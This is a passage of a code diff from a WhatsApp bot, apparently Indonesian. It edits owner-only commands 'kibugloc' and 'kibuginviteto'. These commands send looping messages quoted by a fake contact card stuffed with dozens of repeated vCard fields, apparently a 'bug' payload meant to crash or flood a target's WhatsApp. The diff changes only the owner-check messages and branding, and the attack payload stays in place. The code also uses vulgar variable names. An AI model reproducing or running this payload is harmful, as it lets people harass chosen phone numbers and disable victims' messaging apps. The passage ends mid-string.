@@ -7513,17 +7578,17 @@ await m.reply(`Berhasil Mengirim Bugloc Di Nomer ${text}`)
 }
 break
 case 'kibugloc': {
-if (!isCreator) return m.reply(`KHUSUS OWNER GOBLOK!`)
+if (!isCreator) return m.reply(`FITUR KHUSUS OWNER (PEMILIK BOT)!`)
 if (args.length == 0) return m.reply(`Jumlahnya?`)
 jumlah = `${encodeURI(q)}`
 for (let i = 0; i < jumlah; i++) {
-let kontolfariz = { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(m.chat ? { remoteJid: "@broadcast" } : {})}, message: { "contactMessage":{"displayName": `© ❴ ㅊ ❈ Sana BOT ✯ By ♂🎉 KIKI ORIㅊ ❈ ❵${ngazap(prefix)}`,"vcard":`BEGIN:VCARD\nVERSION:3.0\nN:2;conn;;;\nFN:❴ ㅊ ❈ Sana BOT ✯ By ♂🎉 KIKI ORIㅊ ❈ ❵\nitem1.TEL:+6289653430712\nitem1.X-ABLabel:Celular\nitem2.EMAIL;type=INTERNET:EMAIL;CHARSET=UTF-8;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;\nEND:VCARD` }}}		
+let kontolfariz = { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(m.chat ? { remoteJid: "@broadcast" } : {})}, message: { "contactMessage":{"displayName": `© ❴ ㅊ ❈ Sana BOTㅊ ❈ ❵${ngazap(prefix)}`,"vcard":`BEGIN:VCARD\nVERSION:3.0\nN:2;conn;;;\nFN:❴ ㅊ ❈ Sana BOTㅊ ❈ ❵\nitem1.TEL:+6289653430712\nitem1.X-ABLabel:Celular\nitem2.EMAIL;type=INTERNET:EMAIL;CHARSET=UTF-8;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;\nEND:VCARD` }}}		
 var messa = await prepareWAMessageMedia({ image: fs.readFileSync('./pict.jpg') }, { upload: jobotz.waUploadToServer })
 var location = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
 "locationMessage": {
 						"degreesLatitude": -6.936928157735237,
 						"degreesLongitude": 107.72270679473877,
-						"caption": `© ❴ ㅊ ❈ Sana BOT ✯ By ♂🎉 KIKI ORIㅊ ❈ ❵${philips}`,
+						"caption": `© ❴ ㅊ ❈ Sana BOTㅊ ❈ ❵${philips}`,
 						"jpegThumbnail": messa.imageMessage,
 }
 }), { userJid: m.chat, quoted: kontolfariz })
@@ -7532,16 +7597,16 @@ jobotz.relayMessage(m.chat, location.message, { messageId: location.key.id })
 }
 break
 case 'kibuginviteto': {
-if (!isCreator) return m.reply(`KHUSUS OWNER GOBLOK!`)
+if (!isCreator) return m.reply(`FITUR KHUSUS OWNER (PEMILIK BOT)!`)
 if (!text) throw `Nomernya mana?`
-let farizcoli = { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(m.chat ? { remoteJid: "@broadcast" } : {})}, message: { "contactMessage":{"displayName": `© ❴ ㅊ ❈ Sana BOT ✯ By ♂🎉 KIKI ORIㅊ ❈ ❵${ngazap(prefix)}`,"vcard":`BEGIN:VCARD\nVERSION:3.0\nN:2;conn;;;\nFN:❴ ㅊ ❈ Sana BOT ✯ By ♂🎉 KIKI ORIㅊ ❈ ❵\nitem1.TEL:+6289653430712\nitem1.X-ABLabel:Celular\nitem2.EMAIL;type=INTERNET:EMAIL;CHARSET=UTF-8;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do 